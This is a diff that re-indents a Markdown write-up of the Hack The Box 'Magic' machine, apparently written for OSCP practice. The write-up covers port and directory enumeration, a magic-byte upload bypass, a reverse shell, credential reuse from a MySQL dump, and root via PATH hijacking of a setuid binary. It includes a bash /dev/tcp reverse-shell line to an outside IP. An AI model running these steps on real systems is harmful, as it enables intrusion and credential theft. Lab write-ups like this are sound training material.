@@ -1,7 +1,7 @@
 ## Reconnaissance
 ### Nmap Enumeration
 - We pass the nmap commands (with output):
-	```bash
+```bash
 nmap -sC -sV -vv -p- 10.10.10.185
 nmap -sU --top-ports=10 -vv 10.10.10.185
 
@@ -28,7 +28,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ### Directory Search
 - gobuster :
-	```bash
+```bash
 gobuster dir -u http://magic.htb/ dns --wordlist /usr/share/wordlists/dirb/common.txt
 
 
@@ -46,7 +46,7 @@ Progress: 4614 / 4615 (99.98%)
 
 ```
 - dirsearch :
-	```bash
+```bash
 dirsearch -u 10.10.10.185
 
 ---OUTPUT---
@@ -58,7 +58,7 @@ dirsearch -u 10.10.10.185
 ```
 - ffuf : no output
 - gobuster second search with images directory
-	```bash
+```bash
 gobuster dir -u http://magic.htb/images/ dns --wordlist /usr/share/wordlists/dirb/big.txt
 
 ---OUTPUT---
@@ -67,17 +67,17 @@ gobuster dir -u http://magic.htb/images/ dns --wordlist /usr/share/wordlists/dir
 /uploads          (Status: 301) [Size: 315] [-->http://magic.htb/images/uploads/]
 ```
 - We access http://magic.htb/images/uploads/mime_bypass.php.png with netcat listener listening.
-	- we bypassed checs with magic bytes and adding .png in the end
+- we bypassed checs with magic bytes and adding .png in the end
 - We gain reverse shell as www-data.
-	- get better shell:
-		```bash
+- get better shell:
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 Ctrl+Z
 local_machine > stty raw -echo;fg
 Enter+Enter
 ```
 - Enumerating:
-	```bash
+```bash
 cd /var/www/Magic
 cat db.php5
 ps -ex
@@ -111,7 +111,7 @@ self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName,
  2216 pts/0    R+     0:00 ps -ex APACHE_LOG_DIR=/var/log/apache2 LANG=C INVOCAT
 ```
 - MySQL Enumeration:
-	```bash
+```bash
 mysql doesnt work
 mysqldump -u theseus -p Magic >dump.sql
 (Password:iamkingtheseus)
@@ -120,18 +120,18 @@ cat dump.sql
 ---OUTPUT---
 INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 ```
-	- We find creds:
-		- Username : admin
-		- Password: Th3s3usW4sK1ng
+- We find creds:
+- Username : admin
+- Password: Th3s3usW4sK1ng
 **NOTE: We can also use sqlmap here but didn't use for OSCP training. Also it might be a bit slow judging from IPPSecs video**
 - We try to login as theseus with these credentials:
-	```bash
+```bash
 su theseus
 Password: Th3s3usW4sK1ng
 ```
-	- We gain access as theseus.
+- We gain access as theseus.
 - Create ssh link:
-	```bash
+```bash
 ---LOCAL-MACHINE---
 ssh-keygen -f theseus 
 cat theseus.pub > Copy key
@@ -146,7 +146,7 @@ ssh -i theseus theseus@magic.htb
 ```
 ## Privilege Escalation
 - Enumeration :
-	```bash
+```bash
 sudo -l # cannot use
 uname -a # Nothing interesting
 find / -type f -perm -4000 2>/dev/null # find files with setuid privileges
@@ -155,19 +155,19 @@ find / -type f -perm -4000 2>/dev/null # find files with setuid privileges
 /bin/sysinfo
 ```
 - we pass :
-	```bash
+```bash
 strace -f /bin/sysinfo #to check system calls in a binary
 ```
-	- We see an execve command
-		- we search for other execve commands (Ctrl+Shift+F)
-			```bash
+- We see an execve command
+- we search for other execve commands (Ctrl+Shift+F)
+```bash
 execve("/bin/sh", ["sh", "-c", "lshw -short"], 0x7ffd9dc1c1b8 /* 18 vars */ <unfinished ...
 execve("/bin/sh", ["sh", "-c", "fdisk -l"], 0x7ffd9dc1c1b8 /* 18 vars */) = 0
 execve("/bin/sh", ["sh", "-c", "free -h"], 0x7ffd9dc1c1b8 /* 18 vars */ <unfinished ...>
 ```
-			- **As we can see some of these execve commands don't use absolute path**
+- **As we can see some of these execve commands don't use absolute path**
 - We can create a file with our bash reverse shell script with the same name as one of the above (I've tried free and lshw, both worked)
-	```bash
+```bash
 vi free
 
 ---INPUT---
@@ -175,7 +175,7 @@ vi free
 bash -i >& /dev/tcp/10.10.14.25/9999 0>&1
 ```
 - Make it an executable and then change the $PATH variable location to the current directory and execute the sysinfo binary (with netcat listener listening)
-	```bash
+```bash
 chmod +x free
 echo $PATH : 
 export PATH=$(pwd):$PATH
@@ -187,5 +187,5 @@ export PATH=$(pwd):$PATH
 ---EXPLOIT---
 /bin/sysinfo # With Netcat listener listening
 ```
-	- We gain root shell.
-		- Can add authorzed_key to this ssh folder too for ssh access.
+- We gain root shell.
+- Can add authorzed_key to this ssh folder too for ssh access.
